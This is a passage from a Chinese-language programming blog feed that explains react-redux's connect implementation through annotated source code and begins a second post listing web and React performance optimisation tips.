<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">mapStateToProps, mapDispatchToProps, mergeProps</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// mapStateToPropsFactories默认是</span></span><br><span class="line">    <span class="comment">// var defaultMapDispatchToPropsFactories = [whenMapDispatchToPropsIsFunction, whenMapDispatchToPropsIsMissing, whenMapDispatchToPropsIsObject];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历执行mapStateToPropsFactories中的函数并传入mapStateToProps，返回第一个不为falsy的执行结果</span></span><br><span class="line">    <span class="keyword">var</span> initMapStateToProps = match(mapStateToProps, mapStateToPropsFactories, <span class="string">'mapStateToProps'</span>);</span><br><span class="line">    <span class="keyword">var</span> initMapDispatchToProps = match(mapDispatchToProps, mapDispatchToPropsFactories, <span class="string">'mapDispatchToProps'</span>);</span><br><span class="line">    <span class="keyword">var</span> initMergeProps = match(mergeProps, mergePropsFactories, <span class="string">'mergeProps'</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> connectHOC(selectorFactory, _extends(&#123;</span><br><span class="line">        initMapStateToProps: initMapStateToProps,</span><br><span class="line">        initMapDispatchToProps: initMapDispatchToProps,</span><br><span class="line">        initMergeProps: initMergeProps,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mapStateToProps 是个函数 initMapStateToProps 是 whenMapDispatchToPropsIsFunction 执行过后的结果。</p>
<p>whenMapStateToPropsIsFunction 调用了 wrapMapToPropsFunc(mapStateToProps, ‘mapStateToProps’)，需要分析一下 wrapMapToPropsFunc，它返回的是一个闭包函数，存储了传入的 mapToProps, methodName</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wrapMapToPropsFunc</span>(<span class="params">mapToProps, methodName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">initProxySelector</span>(<span class="params">dispatch, _ref</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> displayName = _ref.displayName</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 顾名思义，就是个代理，stateOrDispatch与mapToProps之间的桥梁</span></span><br><span class="line">        <span class="comment">// 前提是mapToProps必须是个函数</span></span><br><span class="line">        <span class="keyword">var</span> proxy = <span class="function"><span class="keyword">function</span> <span class="title">mapToPropsProxy</span>(<span class="params">stateOrDispatch, ownProps</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> proxy.dependsOnOwnProps</span><br><span class="line">                ? proxy.mapToProps(stateOrDispatch, ownProps)</span><br><span class="line">                : proxy.mapToProps(stateOrDispatch)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// allow detectFactoryAndVerify to get ownProps</span></span><br><span class="line">        proxy.dependsOnOwnProps = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">        proxy.mapToProps = <span class="function"><span class="keyword">function</span> <span class="title">detectFactoryAndVerify</span>(<span class="params"></span><br><span class="line">            stateOrDispatch,</span><br><span class="line">            ownProps</span><br><span class="line">        </span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 原本的属性mapStateToProps</span></span><br><span class="line">            proxy.mapToProps = mapToProps</span><br><span class="line">            <span class="comment">// mapToProps.dependsOnOwnProps !== null &amp;&amp; mapToProps.dependsOnOwnProps !== undefined ? Boolean(mapToProps.dependsOnOwnProps) : mapToProps.length !== 1;</span></span><br><span class="line">            proxy.dependsOnOwnProps = getDependsOnOwnProps(mapToProps)</span><br><span class="line">            <span class="keyword">var</span> props = proxy(stateOrDispatch, ownProps)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> props === <span class="string">'function'</span>) &#123;</span><br><span class="line">                proxy.mapToProps = props</span><br><span class="line">                proxy.dependsOnOwnProps = getDependsOnOwnProps(props)</span><br><span class="line">                props = proxy(stateOrDispatch, ownProps)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            verifyPlainObject(props, displayName, methodName)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> props</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> proxy</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以 initMapStateToProps 执行过后其实就是这个 initProxySelector 闭包。</p>
<p>再来看看 mapDispatchToProps，如果是个函数，那就还是走上面那套。通常这是个对象，所以 initMapDispatchToProps 是执行 whenMapDispatchToPropsIsObject 过后的结果，定义在该对象的函数都将被当作 Redux action creator，如下所示</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whenMapDispatchToPropsIsObject</span>(<span class="params">mapDispatchToProps</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mapDispatchToProps &amp;&amp; <span class="keyword">typeof</span> mapDispatchToProps === <span class="string">'object'</span></span><br><span class="line">        ? wrapMapToPropsConstant(<span class="function"><span class="keyword">function</span>(<span class="params">dispatch</span>) </span>&#123;</span><br><span class="line">              <span class="keyword">return</span> redux.bindActionCreators(mapDispatchToProps, dispatch)</span><br><span class="line">          &#125;)</span><br><span class="line">        : <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么 wrapMapToPropsConstant 返回的是如下函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initConstantSelector</span>(<span class="params">dispatch, options</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> constant = (<span class="function"><span class="keyword">function</span>(<span class="params">dispatch</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//即上文传入的mapStateToProps</span></span><br><span class="line">        <span class="keyword">return</span> redux.bindActionCreators(mapDispatchToProps, dispatch)</span><br><span class="line">    &#125;)(dispatch, options)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">constantSelector</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> constant</span><br><span class="line">    &#125;</span><br><span class="line">    constantSelector.dependsOnOwnProps = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> constantSelector</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>connectHOC 可以通过 createConnect 传入，默认情况是 connectAdvanced:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// selectorFactory 也可以通过 createConnect 传入，默认是 finalPropsSelectorFactory</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connectAdvanced</span>(<span class="params">selectorFactory</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// _ref是传入的包含initMapStateToProps的对象</span></span><br><span class="line">    <span class="comment">// 创建一个新对象复制_ref的值，但不包括第二个参数数组里的value对应key的值</span></span><br><span class="line">    connectOptions = objectWithoutProperties(_ref, [</span><br><span class="line">        <span class="string">'getDisplayName'</span>,</span><br><span class="line">        <span class="string">'methodName'</span>,</span><br><span class="line">        <span class="string">'renderCountProp'</span>,</span><br><span class="line">        <span class="string">'shouldHandleStateChanges'</span>,</span><br><span class="line">        <span class="string">'storeKey'</span>,</span><br><span class="line">        <span class="string">'withRef'</span></span><br><span class="line">    ])</span><br><span class="line">    <span class="comment">// connect(mapStateToProps, mapDispatchToProps)执行过后返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">wrapWithConnect</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">        invariant_1$<span class="number">2</span>(</span><br><span class="line">            <span class="keyword">typeof</span> WrappedComponent == <span class="string">'function'</span>,</span><br><span class="line">            <span class="string">'You must pass a component to the function returned by '</span> +</span><br><span class="line">                (methodName +</span><br><span class="line">                    <span class="string">'. Instead received '</span> +</span><br><span class="line">                    <span class="built_in">JSON</span>.stringify(WrappedComponent))</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> wrappedComponentName =</span><br><span class="line">            WrappedComponent.displayName || WrappedComponent.name || <span class="string">'Component'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> displayName = getDisplayName(wrappedComponentName)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其中包含我们的initMapStateToProps</span></span><br><span class="line">        <span class="keyword">var</span> selectorFactoryOptions = _extends(&#123;&#125;, connectOptions, &#123;</span><br><span class="line">            ...<span class="comment">//省略了一些属性</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 匿名函数，内部生成一个组件，然后返回</span></span><br><span class="line">        <span class="keyword">var</span> Connect = (<span class="function"><span class="keyword">function</span>(<span class="params">_Component</span>) </span>&#123;</span><br><span class="line">            inherits(Connect, _Component)</span><br><span class="line">            <span class="comment">// 这个组件就是我们所说的容器组件了</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">Connect</span>(<span class="params">props, context</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> _this = possibleConstructorReturn(</span><br><span class="line">                    <span class="keyword">this</span>,</span><br><span class="line">                    _Component.call(<span class="keyword">this</span>, props, context)</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将store存到了实例里</span></span><br><span class="line">                _this.store = props[storeKey] || context[storeKey]</span><br><span class="line">                _this.initSelector()</span><br><span class="line">                _this.initSubscription()</span><br><span class="line">                <span class="keyword">return</span> _this</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Connect.prototype.initSelector = <span class="function"><span class="keyword">function</span> <span class="title">initSelector</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// selectorFactory 默认是 finalPropsSelectorFactory，下面会做分析</span></span><br><span class="line">                <span class="keyword">var</span> sourceSelector = selectorFactory(</span><br><span class="line">                    <span class="keyword">this</span>.store.dispatch,</span><br><span class="line">                    selectorFactoryOptions</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">this</span>.selector = makeSelectorStateful(sourceSelector, <span class="keyword">this</span>.store)</span><br><span class="line">                <span class="keyword">this</span>.selector.run(<span class="keyword">this</span>.props)</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;)(react.Component)</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">/**</span><br><span class="line">            此方法将传入的WrappedComponent业务组件的属性方法，但不包括</span><br><span class="line">            REACT_STATICS，KNOWN_STATICS常量中的属性方法复制到Connect组件</span><br><span class="line">        **/</span></span><br><span class="line">        <span class="keyword">return</span> hoistNonReactStatics(Connect, WrappedComponent)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Connect.prototype.initSelector 中调用的 selectorFactory 默认是 finalPropsSelectorFactory，如下，而传入的参数_ref2 中包含了我们上文传入的 initMapStateToProps，initMapDispatchToProps，initMergeProps，还记得吧，这三个参数都是函数，上面做过分析</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalPropsSelectorFactory</span>(<span class="params">dispatch, _ref2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> initMapStateToProps = _ref2.initMapStateToProps,</span><br><span class="line">        initMapDispatchToProps = _ref2.initMapDispatchToProps,</span><br><span class="line">        initMergeProps = _ref2.initMergeProps,</span><br><span class="line">        <span class="comment">// 重新生成一个对象，不包含这三个参数</span></span><br><span class="line">        options = objectWithoutProperties(_ref2, [</span><br><span class="line">            <span class="string">'initMapStateToProps'</span>,</span><br><span class="line">            <span class="string">'initMapDispatchToProps'</span>,</span><br><span class="line">            <span class="string">'initMergeProps'</span></span><br><span class="line">        ])</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">var</span> mapStateToProps = initMapStateToProps(dispatch, options)</span><br><span class="line">    <span class="comment">// 所有redux action creators</span></span><br><span class="line">    <span class="keyword">var</span> mapDispatchToProps = initMapDispatchToProps(dispatch, options)</span><br><span class="line">    <span class="keyword">var</span> mergeProps = initMergeProps(dispatch, options)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        verifySubselectors(</span><br><span class="line">            mapStateToProps,</span><br><span class="line">            mapDispatchToProps,</span><br><span class="line">            mergeProps,</span><br><span class="line">            options.displayName</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> selectorFactory = options.pure</span><br><span class="line">        ? pureFinalPropsSelectorFactory</span><br><span class="line">        : impureFinalPropsSelectorFactory</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> selectorFactory(</span><br><span class="line">        mapStateToProps,</span><br><span class="line">        mapDispatchToProps,</span><br><span class="line">        mergeProps,</span><br><span class="line">        dispatch,</span><br><span class="line">        options</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后来看看 impureFinalPropsSelectorFactory</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">impureFinalPropsSelectorFactory</span>(<span class="params"></span><br><span class="line">    mapStateToProps,</span><br><span class="line">    mapDispatchToProps,</span><br><span class="line">    mergeProps,</span><br><span class="line">    dispatch</span><br><span class="line"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">impureFinalPropsSelector</span>(<span class="params">state, ownProps</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mergeProps(</span><br><span class="line">            mapStateToProps(state, ownProps),</span><br><span class="line">            mapDispatchToProps(dispatch, ownProps),</span><br><span class="line">            ownProps</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到 impureFinalPropsSelector 返回的就是具体的 state 中的值，以及上文的 redux action creators 组成的 props<br>再回头看 Connect 中的 initSelector：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceSelector = selectorFactory(</span><br><span class="line">    <span class="keyword">this</span>.store.dispatch,</span><br><span class="line">    selectorFactoryOptions</span><br><span class="line">)</span><br><span class="line"><span class="keyword">this</span>.selector = makeSelectorStateful(sourceSelector, <span class="keyword">this</span>.store)</span><br><span class="line"><span class="comment">// 将传入的mapStateToProps、mapDispatchToProps与this.props合并，并放到this.selector.props中</span></span><br><span class="line"><span class="keyword">this</span>.selector.run(<span class="keyword">this</span>.props)</span><br></pre></td></tr></table></figure>
<p>selectorFactory 就是 impureFinalPropsSelectorFactory 的返回值。<br>看一下 makeSelectorStateful：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeSelectorStateful</span>(<span class="params">sourceSelector, store</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// wrap the selector in an object that tracks its results between runs.</span></span><br><span class="line">    <span class="keyword">var</span> selector = &#123;</span><br><span class="line">        run: <span class="function"><span class="keyword">function</span> <span class="title">runComponentSelector</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 更新注入其中的mapStateToProps、mapDispatchToProps中注入过去的值</span></span><br><span class="line">                <span class="keyword">var</span> nextProps = sourceSelector(store.getState(), props)</span><br><span class="line">                <span class="keyword">if</span> (nextProps !== selector.props || selector.error) &#123;</span><br><span class="line">                    <span class="comment">// 容器组件是否更新也是取决于此</span></span><br><span class="line">                    selector.shouldComponentUpdate = <span class="literal">true</span></span><br><span class="line">                    <span class="comment">// 更新props，</span></span><br><span class="line">                    selector.props = nextProps</span><br><span class="line">                    selector.error = <span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                selector.shouldComponentUpdate = <span class="literal">true</span></span><br><span class="line">                selector.error = error</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> selector</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过这一系列的处理，我们的 mapStateToProps, mapDispatchToProps 涉及的 state 和 dispatch redux action creators 都一起放到了一个 Connect 组件的 selector.props</p>
<p>Connect 的 render 方法里直接重新创建一个 element 将 selector.props 放入到我们传入的实际业务组件里：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Connect.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> selector = <span class="keyword">this</span>.selector</span><br><span class="line">    selector.shouldComponentUpdate = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (selector.error) &#123;</span><br><span class="line">        <span class="keyword">throw</span> selector.error</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> react.createElement(</span><br><span class="line">            WrappedComponent,</span><br><span class="line">            <span class="keyword">this</span>.addExtraProps(selector.props)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以经过上面这些流程，我们就可以在业务组件里直接使用 this.props.stateName, this.props.dispatchName 来使用我们的方法了。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>react-redux 首先通过 Provider 借用 getChildContext 让子组件取到 store，然后 connect 函数中在 connectHOC 之前，通过判断 mapStateToProps/mapDispatchToProps 的类型，分别创建闭包函数，然后在 connectHOC 中，创建一个 Connect 容器组件，在这个容器组件中将之前处理过的闭包函数赋值到 Connect 的 selector，并且将 selector 具体的属性注入到子组件的 props 里，同时 setState、shouldComponentWillUpdate 等操作或者判断都在操作这个 selector，以此来完成整个组件更新。</p>
<p>代码中运用了大量的函数式编程，要搞清楚还是要花点时间。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;redux 和 react-redux 是两个不同的库，redux 的出现是为了解决大型应用中组件状态管理混乱的问题，react-redux
    
    </summary>
    
    
      <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
    
      <category term="react-redux" scheme="http://myt0.com/tags/react-redux/"/>
    
      <category term="react" scheme="http://myt0.com/tags/react/"/>
    
      <category term="redux" scheme="http://myt0.com/tags/redux/"/>
    
  </entry>
  
  <entry>
    <title>web性能优化</title>
    <link href="http://myt0.com/2018/06/27/web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://myt0.com/2018/06/27/web性能优化/</id>
    <published>2018-06-27T13:00:00.000Z</published>
    <updated>2018-07-17T15:13:56.127Z</updated>
    
    <content type="html"><![CDATA[<h3 id="减少-DNS-解析，减少不同域名请求数量"><a href="#减少-DNS-解析，减少不同域名请求数量" class="headerlink" title="减少 DNS 解析，减少不同域名请求数量"></a>减少 DNS 解析，减少不同域名请求数量</h3><h3 id="减少-HTTP-请求"><a href="#减少-HTTP-请求" class="headerlink" title="减少 HTTP 请求"></a>减少 HTTP 请求</h3><h3 id="使用浏览器缓存，通过设置-HTTP-头的-cache-control-和-expires-属性，设定缓存时间"><a href="#使用浏览器缓存，通过设置-HTTP-头的-cache-control-和-expires-属性，设定缓存时间" class="headerlink" title="使用浏览器缓存，通过设置 HTTP 头的 cache-control 和 expires 属性，设定缓存时间"></a>使用浏览器缓存，通过设置 HTTP 头的 cache-control 和 expires 属性，设定缓存时间</h3><h3 id="服务端启用-GZIP-压缩，合并-HTML、CSS、Javascript-文件"><a href="#服务端启用-GZIP-压缩，合并-HTML、CSS、Javascript-文件" class="headerlink" title="服务端启用 GZIP 压缩，合并 HTML、CSS、Javascript 文件"></a>服务端启用 GZIP 压缩，合并 HTML、CSS、Javascript 文件</h3><h3 id="CSS-Sprites，合并图片，这也可以减少-HTTP-请求"><a href="#CSS-Sprites，合并图片，这也可以减少-HTTP-请求" class="headerlink" title="CSS Sprites，合并图片，这也可以减少 HTTP 请求"></a>CSS Sprites，合并图片，这也可以减少 HTTP 请求</h3><h3 id="LazyLoad-Images-只加载首屏图片，滚动之后再加载需要看到的图片"><a href="#LazyLoad-Images-只加载首屏图片，滚动之后再加载需要看到的图片" class="headerlink" title="LazyLoad Images 只加载首屏图片，滚动之后再加载需要看到的图片"></a>LazyLoad Images 只加载首屏图片，滚动之后再加载需要看到的图片</h3><h3 id="CSS-放-header，JS-放底部，防止-JS-阻塞"><a href="#CSS-放-header，JS-放底部，防止-JS-阻塞" class="headerlink" title="CSS 放 header，JS 放底部，防止 JS 阻塞"></a>CSS 放 header，JS 放底部，防止 JS 阻塞</h3><h3 id="异步请求数据"><a href="#异步请求数据" class="headerlink" title="异步请求数据"></a>异步请求数据</h3><h3 id="减少-Cookie-传输"><a href="#减少-Cookie-传输" class="headerlink" title="减少 Cookie 传输"></a>减少 Cookie 传输</h3><h3 id="JS-代码优化"><a href="#JS-代码优化" class="headerlink" title="JS 代码优化"></a>JS 代码优化</h3><ul>
<li>减少操作 DOM 次数</li>
<li>慎用 with</li>
<li>避免使用 eval 和 Function</li>
<li>减少作用域查找</li>
<li>JS 对直接量和局部变量查找最快，如果对 JS 对象属性查找超过一次，设置局部变量</li>
<li>字符串拼接，+效率低，如果字符串较多，放到数组，使用 join 拼接</li>
</ul>
<h3 id="CSS-编写优化"><a href="#CSS-编写优化" class="headerlink" title="CSS 编写优化"></a>CSS 编写优化</h3><ul>
<li>不使用 import</li>
<li>合理使用继承</li>
<li>抽离，拆分，不加载所有 CSS，只在需要的时候加载</li>
<li>减少 reflow/repaint</li>
<li>指定图像尺寸</li>
<li>精简页面样式</li>
<li>慎重使用高性能属性，如浮动，定位</li>
<li>不要使用 CSS 表达式</li>
<li>CSS 选择器查找为从右向左，避免使用通配选择器</li>
<li>避免单规则属性选择器</li>
<li>避免类正则选择器</li>
</ul>
<h3 id="CDN-加速"><a href="#CDN-加速" class="headerlink" title="CDN 加速"></a>CDN 加速</h3><h3 id="反向代理，负载均衡"><a href="#反向代理，负载均衡" class="headerlink" title="反向代理，负载均衡"></a>反向代理，负载均衡</h3><h3 id="react-性能优化"><a href="#react-性能优化" class="headerlink" title="react 性能优化"></a>react 性能优化</h3><h4 id="组件化，模块化"><a href="#组件化，模块化" class="headerlink" title="组件化，模块化"></a>组件化，模块化</h4><p>UI 组件不涉及业务，上层组件统一处理业务逻辑</p>
<h4 id="使用-shouldComponentUpdate-和-PureComponent"><a href="#使用-shouldComponentUpdate-和-PureComponent" class="headerlink" title="使用 shouldComponentUpdate 和 PureComponent"></a>使用 shouldComponentUpdate 和 PureComponent</h4><p>PureComponent 自动实现了 shouldComponentMount， 如果 props、state 未改变，则不会重新 render，此比较为浅比较，不包含对象属性</p>
<h4 id="多个相同组件，设置-Key-值"><a href="#多个相同组件，设置-Key-值" class="headerlink" title="多个相同组件，设置 Key 值"></a>多个相同组件，设置 Key 值</h4><p>如果多个相同组件处于同一层级，要设置 key 值，这样可以减少组件更新，确切地更新到需要更新的组件<br>注意：key 值要稳定不变的唯一值，所以尽量不要使用数组下标做 key 值</p>
<h4 id="在-componentWillUnmount-做必要的销毁"><a href="#在-componentWillUnmount-做必要的销毁" class="headerlink" title="在 componentWillUnmount 做必要的销毁"></a>在 componentWillUnmount 做必要的销毁</h4>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;减少-DNS-解析，减少不同域名请求数量&quot;&gt;&lt;a href=&quot;#减少-DNS-解析，减少不同域名请求数量&quot; class=&quot;headerlink&quot; title=&quot;减少 DNS 解析，减少不同域名请求数量&quot;&gt;&lt;/a&gt;减少 DNS 解析，减少不同域名请求数量&lt;/h3&gt;&lt;
    
    </summary>
    
    
      <category term="frontend" scheme="http://myt0.com/tags/frontend/"/>
    
      <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
    
